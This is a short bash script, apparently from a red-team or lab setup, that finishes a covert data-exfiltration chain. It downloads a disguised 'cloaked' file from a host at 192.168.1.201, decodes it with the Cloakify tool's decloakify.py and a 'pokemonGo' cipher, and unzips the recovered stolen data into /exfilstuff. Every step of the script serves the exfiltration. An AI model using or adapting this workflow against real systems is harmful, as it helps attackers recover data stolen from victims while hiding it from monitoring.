#!/bin/bash

BLUE="\033[1;34m"
RED="\033[0;31m"
GREEN="\033[0;32m"
BGREEN="\033[1;32m"
NC="\033[0m" # No Color

echo -e "${BGREEN}\n[+]${NC} Downloading exfil file from webpage...${NC}"
curl -L -o /ignorethis.cloaked http://192.168.1.201:8888/upload/ignorethis.cloaked

echo -e "${BGREEN}\n[+]${NC} Decrypting the exfil file...${NC}"
python2 decloakify.py ignorethis.cloaked pokemonGo > exfildata.zip

echo -e "${BGREEN}\n[+]${NC} Unzipping...${NC}"
mkdir /exfilstuff
unzip exfildata.zip -d /exfilstuff

echo -e "${BLUE}\n[+]${NC} All done! Check inside the exfilstuff folder${NC}"
